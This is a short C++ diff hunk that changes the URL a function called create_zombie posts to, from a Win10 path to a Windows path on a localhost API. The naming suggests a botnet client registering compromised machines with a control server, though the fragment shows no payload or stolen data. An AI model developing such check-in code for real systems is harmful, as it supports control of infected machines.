@@ -32,7 +32,7 @@ bool vaev::api::create_zombie()
 
     if (curl)
     {
-        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:4000/api/v1/zombie/Win10");
+        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:4000/api/v1/zombie/Windows");
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
